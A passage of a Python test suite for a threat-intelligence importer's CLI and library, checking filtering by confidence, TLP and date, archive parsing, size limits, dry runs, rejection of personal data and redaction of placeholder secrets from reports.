            CtiObservationImportConfig(
                connector_id="stix_taxii_import",
                engagement_id=1001,
                fail_on_empty=True,
            ),
            report_text=json.dumps(report),
        )
    finally:
        con.close()

    assert result["fail_on_empty"] is True
    assert result["persisted_count"] == 0
    assert result["duplicate_count"] == 1


def test_cti_import_limit_bounds_processed_items(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    report = {
        "items": [
            {"type": "domain", "value": "one.acme.example"},
            {"type": "domain", "value": "two.acme.example"},
            {"type": "domain", "value": "three.acme.example"},
        ]
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="stix_taxii_import",
                engagement_id=1001,
                limit=2,
            ),
            report_text=json.dumps(report),
        )
        values = [
            row["indicator_value"]
            for row in con.execute(
                """
                SELECT indicator_value
                FROM cti_observations
                ORDER BY indicator_value
                """
            ).fetchall()
        ]
    finally:
        con.close()

    assert result["total_item_count"] == 3
    assert result["processed_item_count"] == 2
    assert result["limited_item_count"] == 1
    assert result["parsed_count"] == 2
    assert result["persisted_count"] == 2
    assert values == ["one.acme.example", "two.acme.example"]


def test_cti_import_min_confidence_filters_low_confidence_observations(
    tmp_path: Path,
) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    report = {
        "items": [
            {"type": "domain", "value": "low.acme.example", "confidence": 0.2},
            {"type": "domain", "value": "high.acme.example", "confidence": 0.9},
        ]
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="stix_taxii_import",
                engagement_id=1001,
                min_confidence=0.5,
            ),
            report_text=json.dumps(report),
        )
        values = [
            row["indicator_value"]
            for row in con.execute(
                "SELECT indicator_value FROM cti_observations"
            ).fetchall()
        ]
    finally:
        con.close()

    assert result["min_confidence"] == 0.5
    assert result["parsed_count"] == 2
    assert result["filtered_count"] == 1
    assert result["persisted_count"] == 1
    assert result["skipped_count"] == 1
    assert result["skipped"][0]["reason"] == "below_min_confidence"
    assert values == ["high.acme.example"]


def test_cti_import_max_tlp_filters_restricted_observations(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    report = {
        "items": [
            {"type": "domain", "value": "clear.acme.example", "tlp": "clear"},
            {"type": "domain", "value": "green.acme.example", "tlp": "green"},
            {"type": "domain", "value": "amber.acme.example", "tlp": "amber"},
        ]
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="stix_taxii_import",
                engagement_id=1001,
                max_tlp="green",
            ),
            report_text=json.dumps(report),
        )
        rows = con.execute(
            "SELECT indicator_value, tlp FROM cti_observations ORDER BY indicator_value"
        ).fetchall()
    finally:
        con.close()

    assert result["max_tlp"] == "TLP:GREEN"
    assert result["parsed_count"] == 3
    assert result["filtered_count"] == 1
    assert result["persisted_count"] == 2
    assert result["skipped_count"] == 1
    assert result["skipped"][0]["reason"] == "above_max_tlp"
    assert [(row["indicator_value"], row["tlp"]) for row in rows] == [
        ("clear.acme.example", "TLP:CLEAR"),
        ("green.acme.example", "TLP:GREEN"),
    ]


def test_cti_import_observed_window_filters_out_of_range_rows(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    report = {
        "items": [
            {
                "type": "domain",
                "value": "old.acme.example",
                "observed_at": "2026-08-19T23:59:00Z",
            },
            {
                "type": "domain",
                "value": "kept.acme.example",
                "observed_at": "2026-08-20 10:00:00 UTC",
            },
            {
                "type": "domain",
                "value": "future.acme.example",
                "observed_at": "2026-08-21T00:01:00Z",
            },
        ]
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="stix_taxii_import",
                engagement_id=1001,
                since="2026-08-20T00:00:00Z",
                until="2026-08-21T00:00:00Z",
            ),
            report_text=json.dumps(report),
        )
        values = [
            row["indicator_value"]
            for row in con.execute(
                "SELECT indicator_value FROM cti_observations"
            ).fetchall()
        ]
    finally:
        con.close()

    assert result["since"] == "2026-08-20T00:00:00Z"
    assert result["until"] == "2026-08-21T00:00:00Z"
    assert result["parsed_count"] == 3
    assert result["filtered_count"] == 2
    assert result["persisted_count"] == 1
    assert {row["reason"] for row in result["skipped"]} == {"before_since", "after_until"}
    assert values == ["kept.acme.example"]


def test_cti_observations_surface_as_non_reportable_inventory(tmp_path: Path) -> None:
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    secret_value = "secret-token-should-not-persist"
    report = {
        "items": [
            {
                "type": "domain",
                "value": "Portal.Acme.Example",
                "confidence": 0.8,
                "tlp": "clear",
                "provenance": f"URLHaus import password={secret_value}",
                "raw_body": f"token={secret_value}",
            }
        ]
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="abusech_urlhaus",
                engagement_id=1001,
                provider="urlhaus",
                source_url=f"https://urlhaus.example/export?api_key={secret_value}&ok=1",
                promote_targets=False,
                operator="cti-test",
            ),
            report_text=json.dumps(report),
        )
    finally:
        con.close()

    reports_dir = tmp_path / "reports"
    ctx = ContextBuilder(db_path, 1001).build()
    rendered = ReportSynthesizer(
        db_path,
        output_dir=reports_dir,
        provider="template",
        assume_yes=True,
    )._render_skeleton(ctx)
    csv_rows = ReportSynthesizer._raw_export_csv_rows(ctx)
    generate_dashboard(
        data_dir=data_dir,
        reports_dir=reports_dir,
        output_path=reports_dir / "dashboard.html",
    )
    overview = json.loads(
        (reports_dir / "dashboard" / "data" / "engagements.json").read_text(
            encoding="utf-8"
        )
    )
    slug = next(item["slug"] for item in overview["items"] if item["id"] == "1001")
    detail_payload = json.loads(
        (reports_dir / "dashboard" / "data" / "engagements" / f"{slug}.json").read_text(
            encoding="utf-8"
        )
    )

    cti_csv_rows = [row for row in csv_rows if row["record_type"] == "cti_observation"]
    detail_rows = detail_payload["sections"]["cti_observations"]
    blob = json.dumps(
        {
            "result": result,
            "context": ctx.cti_observation_inventory,
            "rendered": rendered,
            "csv_rows": cti_csv_rows,
            "detail_rows": detail_rows,
        },
        sort_keys=True,
    )

    assert result["persisted_count"] == 1
    assert len(ctx.cti_observation_inventory) == 1
    assert ctx.exploits.finding_count == 0
    assert not any(row["record_type"] == "finding" for row in cti_csv_rows)
    assert cti_csv_rows[0]["cti_reportable"] == "False"
    assert "### 4.0 CTI Observation Inventory (Not Findings)" in rendered
    assert "`portal.acme.example`" in rendered
    assert detail_rows[0]["Indicator"] == "portal.acme.example"
    assert detail_rows[0]["Reportable"] == "no"
    assert "api_key=" not in blob
    assert secret_value not in blob


def test_connector_cli_import_cti_invokes_offline_importer(
    tmp_path: Path,
    monkeypatch,
) -> None:
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    report_file = tmp_path / "cti.json"
    report_file.write_text(
        json.dumps({"items": [{"type": "domain", "value": "portal.acme.example"}]}),
        encoding="utf-8",
    )
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "stix_taxii_import",
            "--report-file",
            str(report_file),
            "--source-url",
            "local-stix-fixture",
            "--promote-targets",
            "--json",
        ],
    )

    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert payload["result_schema_version"] == "forge.cti_observation_import.v1"
    assert payload["connector_id"] == "stix_taxii_import"
    assert payload["report_container_format"] == "plain"
    assert payload["report_member"] == ""
    assert payload["persisted_count"] == 1
    assert payload["promoted_seed_count"] == 1


def test_connector_cli_import_cti_reads_gzipped_csv_export(
    tmp_path: Path,
    monkeypatch,
) -> None:
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    report_file = tmp_path / "threatfox.csv.gz"
    with gzip.open(report_file, "wt", encoding="utf-8") as handle:
        handle.write(
            "\n".join(
                [
                    "id,ioc,ioc_type,confidence_level,first_seen",
                    "41,Portal.Acme.Example,domain,75,2026-08-20 10:00:00 UTC",
                ]
            )
        )
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "abusech_threatfox",
            "--report-file",
            str(report_file),
            "--json",
        ],
    )

    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert payload["source_format"] == "csv"
    assert payload["report_container_format"] == "gzip"
    assert payload["report_member"] == ""
    assert payload["parsed_count"] == 1
    assert payload["persisted_count"] == 1
    assert payload["parsed_indicator_type_counts"] == {"domain": 1}


def test_connector_cli_import_cti_reads_supabase_csv_export(
    tmp_path: Path,
    monkeypatch,
) -> None:
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    report_file = tmp_path / "supabase-targets.csv"
    report_file.write_text(
        "\n".join(
            [
                "ID,Table_Name,Target_Type,Target_Value,First_Seen_At,Confidence",
                "row-1,candidate_targets,domain,Portal.Acme.Example,2026-08-20T10:00:00Z,0.9",
            ]
        ),
        encoding="utf-8",
    )
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "supabase_table_import",
            "--report-file",
            str(report_file),
            "--promote-targets",
            "--json",
        ],
    )

    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert payload["source_format"] == "csv"
    assert payload["connector_id"] == "supabase_table_import"
    assert payload["parsed_count"] == 1
    assert payload["persisted_count"] == 1
    assert payload["promoted_seed_count"] == 1
    assert payload["target_feed_type_counts"] == {"domain": 1}


def test_connector_cli_import_cti_reads_zipped_csv_export(
    tmp_path: Path,
    monkeypatch,
) -> None:
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    report_file = tmp_path / "urlhaus.zip"
    secret_value = "zipped-urlhaus-token"
    with zipfile.ZipFile(report_file, "w") as archive:
        archive.writestr(
            "exports/urlhaus.csv",
            "\n".join(
                [
                    "id,url,url_status,threat,dateadded,urlhaus_reference",
                    (
                        "9001,"
                        f"https://portal.acme.example/download?token={secret_value}&ok=1,"
                        "online,malware_download,2026-08-20 10:00:00 UTC,"
                        f"https://urlhaus.abuse.ch/url/9001/?api_key={secret_value}&ok=1"
                    ),
                ]
            ),
        )
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "abusech_urlhaus",
            "--report-file",
            str(report_file),
            "--json",
        ],
    )

    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert payload["source_format"] == "csv"
    assert payload["report_container_format"] == "zip"
    assert payload["report_member"] == "exports/urlhaus.csv"
    assert payload["parsed_count"] == 1
    assert payload["persisted_count"] == 1
    assert payload["parsed_indicator_type_counts"] == {"url": 1}
    assert secret_value not in result.output


def test_connector_cli_import_cti_rejects_oversized_gzip_report(
    tmp_path: Path,
    monkeypatch,
) -> None:
    monkeypatch.setattr(cti_module, "MAX_CTI_REPORT_TEXT_BYTES", 32)
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    report_file = tmp_path / "oversized.csv.gz"
    with gzip.open(report_file, "wt", encoding="utf-8") as handle:
        handle.write("id,ioc,ioc_type\n41,Portal.Acme.Example,domain\n")
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "abusech_threatfox",
            "--report-file",
            str(report_file),
            "--dry-run",
            "--json",
        ],
    )

    assert result.exit_code != 0
    assert "gzipped report is too large" in result.output


def test_connector_cli_import_cti_rejects_oversized_zip_member(
    tmp_path: Path,
    monkeypatch,
) -> None:
    monkeypatch.setattr(cti_module, "MAX_CTI_REPORT_TEXT_BYTES", 32)
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    report_file = tmp_path / "oversized.zip"
    with zipfile.ZipFile(report_file, "w") as archive:
        archive.writestr(
            "exports/threatfox.csv",
            "id,ioc,ioc_type\n41,Portal.Acme.Example,domain\n",
        )
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "abusech_threatfox",
            "--report-file",
            str(report_file),
            "--dry-run",
            "--json",
        ],
    )

    assert result.exit_code != 0
    assert "ZIP member is too large" in result.output


def test_connector_cli_import_cti_rejects_zip_without_report_member(
    tmp_path: Path,
    monkeypatch,
) -> None:
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    report_file = tmp_path / "unsupported.zip"
    with zipfile.ZipFile(report_file, "w") as archive:
        archive.writestr("readme.txt", "not a CTI report")
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "stix_taxii_import",
            "--report-file",
            str(report_file),
            "--dry-run",
            "--json",
        ],
    )

    con = sqlite3.connect(db_path)
    try:
        cti_table = con.execute(
            "SELECT 1 FROM sqlite_master WHERE type='table' AND name='cti_observations'"
        ).fetchone()
    finally:
        con.close()
    assert result.exit_code != 0
    assert "does not contain JSON, CSV, or GZ" in result.output
    assert cti_table is None


def test_connector_cli_import_cti_dry_run_writes_nothing(
    tmp_path: Path,
    monkeypatch,
) -> None:
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    secret_value = "cli-dry-run-secret"
    report_file = tmp_path / "cti.json"
    report_file.write_text(
        json.dumps(
            {
                "items": [
                    {
                        "type": "domain",
                        "value": "portal.acme.example",
                        "provenance": f"operator token={secret_value}",
                    }
                ]
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "stix_taxii_import",
            "--report-file",
            str(report_file),
            "--promote-targets",
            "--dry-run",
            "--json",
        ],
    )

    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    con = sqlite3.connect(db_path)
    try:
        cti_table = con.execute(
            "SELECT 1 FROM sqlite_master WHERE type='table' AND name='cti_observations'"
        ).fetchone()
    finally:
        con.close()
    assert payload["status"] == "dry_run"
    assert payload["persisted_count"] == 0
    assert payload["would_persist_count"] == 1
    assert payload["promoted_seed_count"] == 0
    assert payload["would_promote_seed_count"] == 1
    assert cti_table is None
    assert secret_value not in result.output


def test_connector_cli_import_cti_fail_on_empty_exits_nonzero(
    tmp_path: Path,
    monkeypatch,
) -> None:
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    report_file = tmp_path / "cti.json"
    report_file.write_text(
        json.dumps({"items": [{"type": "phone", "value": "+1 555 123 4567"}]}),
        encoding="utf-8",
    )
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "stix_taxii_import",
            "--report-file",
            str(report_file),
            "--dry-run",
            "--fail-on-empty",
            "--json",
        ],
    )

    con = sqlite3.connect(db_path)
    try:
        cti_table = con.execute(
            "SELECT 1 FROM sqlite_master WHERE type='table' AND name='cti_observations'"
        ).fetchone()
        audit_count = con.execute(
            """
            SELECT COUNT(*)
            FROM audit_log
            WHERE engagement_id=1001 AND action='cti_observation_import'
            """
        ).fetchone()[0]
    finally:
        con.close()
    assert result.exit_code != 0
    assert "no accepted observations" in result.output
    assert cti_table is None
    assert audit_count == 0


def test_connector_cli_import_cti_reports_sensitive_rejection_counts(
    tmp_path: Path,
    monkeypatch,
) -> None:
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    report_file = tmp_path / "cti.json"
    secret_value = "private-message-token"
    report_file.write_text(
        json.dumps(
            {
                "items": [
                    {"type": "phone", "value": "+1 555 123 4567"},
                    {"type": "person", "value": "Jane Example"},
                    {"type": "private_message", "value": f"token={secret_value}"},
                ]
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "stix_taxii_import",
            "--report-file",
            str(report_file),
            "--dry-run",
            "--json",
        ],
    )

    con = sqlite3.connect(db_path)
    try:
        cti_table = con.execute(
            "SELECT 1 FROM sqlite_master WHERE type='table' AND name='cti_observations'"
        ).fetchone()
    finally:
        con.close()
    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert payload["status"] == "dry_run"
    assert payload["parsed_count"] == 0
    assert payload["skipped_count"] == 3
    assert payload["rejected_sensitive_type_counts"] == {
        "person": 1,
        "phone": 1,
        "private_message": 1,
    }
    assert cti_table is None
    assert secret_value not in result.output


def test_connector_cli_import_cti_limit_is_passed_to_importer(
    tmp_path: Path,
    monkeypatch,
) -> None:
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    report_file = tmp_path / "cti.json"
    report_file.write_text(
        json.dumps(
            {
                "items": [
                    {"type": "domain", "value": "one.acme.example"},
                    {"type": "domain", "value": "two.acme.example"},
                ]
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "stix_taxii_import",
            "--report-file",
            str(report_file),
            "--limit",
            "1",
            "--json",
        ],
    )

    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert payload["limit"] == 1
    assert payload["total_item_count"] == 2
    assert payload["processed_item_count"] == 1
    assert payload["limited_item_count"] == 1
    assert payload["persisted_count"] == 1


def test_connector_cli_import_cti_min_confidence_dry_run(
    tmp_path: Path,
    monkeypatch,
) -> None:
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    report_file = tmp_path / "cti.json"
    report_file.write_text(
        json.dumps(
            {
                "items": [
                    {"type": "domain", "value": "low.acme.example", "confidence": 0.2},
                    {"type": "domain", "value": "high.acme.example", "confidence": 0.9},
                ]
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "stix_taxii_import",
            "--report-file",
            str(report_file),
            "--min-confidence",
            "0.5",
            "--dry-run",
            "--json",
        ],
    )

    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert payload["status"] == "dry_run"
    assert payload["min_confidence"] == 0.5
    assert payload["parsed_count"] == 2
    assert payload["filtered_count"] == 1
    assert payload["would_persist_count"] == 1
    assert payload["skipped"][0]["reason"] == "below_min_confidence"


def test_connector_cli_import_cti_max_tlp_dry_run(
    tmp_path: Path,
    monkeypatch,
) -> None:
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    report_file = tmp_path / "cti.json"
    report_file.write_text(
        json.dumps(
            {
                "items": [
                    {"type": "domain", "value": "green.acme.example", "tlp": "green"},
                    {"type": "domain", "value": "red.acme.example", "tlp": "red"},
                ]
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "stix_taxii_import",
            "--report-file",
            str(report_file),
            "--max-tlp",
            "green",
            "--dry-run",
            "--json",
        ],
    )

    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert payload["status"] == "dry_run"
    assert payload["max_tlp"] == "TLP:GREEN"
    assert payload["parsed_count"] == 2
    assert payload["filtered_count"] == 1
    assert payload["would_persist_count"] == 1
    assert payload["parsed_tlp_counts"] == {"TLP:GREEN": 1, "TLP:RED": 1}
    assert payload["skipped_reason_counts"] == {"above_max_tlp": 1}
    assert payload["skipped"][0]["reason"] == "above_max_tlp"


def test_connector_cli_import_cti_observed_window_dry_run(
    tmp_path: Path,
    monkeypatch,
) -> None:
    data_dir = tmp_path / "data"
    db_path = data_dir / "engagements" / "1001.db"
    con = _build_cti_db(db_path)
    con.close()
    report_file = tmp_path / "cti.json"
    report_file.write_text(
        json.dumps(
            {
                "items": [
                    {
                        "type": "domain",
                        "value": "old.acme.example",
                        "observed_at": "2026-08-19T23:59:00Z",
                    },
                    {
                        "type": "domain",
                        "value": "kept.acme.example",
                        "observed_at": "2026-08-20T12:00:00Z",
                    },
                ]
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setenv("FORGE_DATA_DIR", str(data_dir))

    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")
    result = CliRunner().invoke(
        app,
        [
            "connectors",
            "import-cti",
            "--engagement",
            "1001",
            "--connector",
            "stix_taxii_import",
            "--report-file",
            str(report_file),
            "--since",
            "2026-08-20T00:00:00Z",
            "--dry-run",
            "--json",
        ],
    )

    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert payload["status"] == "dry_run"
    assert payload["since"] == "2026-08-20T00:00:00Z"
    assert payload["parsed_count"] == 2
    assert payload["filtered_count"] == 1
    assert payload["would_persist_count"] == 1
    assert payload["skipped"][0]["reason"] == "before_since"
